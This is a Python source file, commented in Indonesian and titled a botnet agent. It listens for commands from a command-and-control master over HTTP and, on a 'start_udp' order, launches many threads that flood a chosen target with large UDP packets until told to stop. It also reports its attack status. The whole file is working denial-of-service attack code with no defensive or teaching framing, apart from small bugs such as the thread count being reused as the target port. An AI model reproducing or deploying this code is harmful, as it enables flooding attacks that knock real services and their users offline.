# worker_node.py - Botnet Agent
import socket
import threading
import json
import time
import requests

# --- KONFIGURASI ---
WORKER_ID = socket.gethostbyname(socket.gethostname())
PORT = 8081 # Port untuk C2 Master
UDP_PORT = 0

# Global State
is_attacking = False
target_host = ""
target_port = 0
worker_threads = []

def run_udp_flood(t_host, t_port):
 """Thread untuk mengirim UDP Packets Ganas"""
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.settimeout(1)
 
 # Payload besar (2048 bytes) untuk saturasi bandwidth
 payload = b"X" * 2048 
 
 while is_attacking:
 try:
 # Kirim paket UDP
 sock.sendto(payload, (t_host, t_port))
 # Delay acak sedikit untuk variasi traffic
 time.sleep(0.0005) 
 except Exception as e:
 if "timed out" not in str(e):
 pass

def handle_http_request():
 """HTTP Server sederhana untuk menerima perintah dari Master"""
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class Handler(BaseHTTPRequestHandler):
 def do_POST(self):
 global is_attacking, target_host, target_port, worker_threads
 
 content_length = int(self.headers['Content-Length'])
 post_data = self.rfile.read(content_length)
 data = json.loads(post_data.decode())
 
 cmd = data.get('cmd')
 payload = data.get('payload', {})
 
 if cmd == "start_udp":
 # Matikan attack lama jika ada
 is_attacking = False
 
 # Update target baru
 target_host = payload['target']
 # Menggunakan jumlah thread sebagai target port (atau bisa diubah ke port spesifik)
 target_port = payload.get('threads', 50)
 t_threads = payload.get('threads', 50)
 
 print(f"[{WORKER_ID}] MULAI SERANGAN: {target_host} dengan {t_threads} thread")
 
 # Reset threads
 for t in worker_threads:
 t.join()
 worker_threads = []
 
 # Jalankan attack baru
 is_attacking = True
 
 for _ in range(t_threads):
 t = threading.Thread(target=run_udp_flood, args=(target_host, target_port))
 t.start()
 worker_threads.append(t)
 
 elif cmd == "stop":
 is_attacking = False
 print(f"[{WORKER_ID}] SERANGAN DIHENTIKAN")
 
 self.send_response(200)
 self.end_headers()
 self.wfile.write(b"OK")

 def do_GET(self):
 if self.path == '/status':
 status = "ATTACKING" if is_attacking else "IDLE"
 self.send_response(200)
 self.send_header('Content-type', 'text/plain')
 self.end_headers()
 self.wfile.write(f"{WORKER_ID}:{status}:{len(worker_threads)}".encode())
 else:
 self.send_response(404)

 server = HTTPServer(('0.0.0.0', PORT), Handler)
 print(f"[{WORKER_ID}] Worker berjalan di http://0.0.0.0:{PORT}")
 server.serve_forever()

if __name__ == "__main__":
 try:
 # Cek koneksi internet
 requests.get("https://8.8.8.8", timeout=3)
 print(f"[{WORKER_ID}] SYSTEM ONLINE")
 except:
 print(f"[{WORKER_ID}] WARNING: NO INTERNET")
 
 # Jalankan server HTTP untuk C2
 server_thread = threading.Thread(target=handle_http_request)
 server_thread.daemon = True
 server_thread.start()
 
 # Loop agar script tidak mati
 while True:
 time.sleep(1)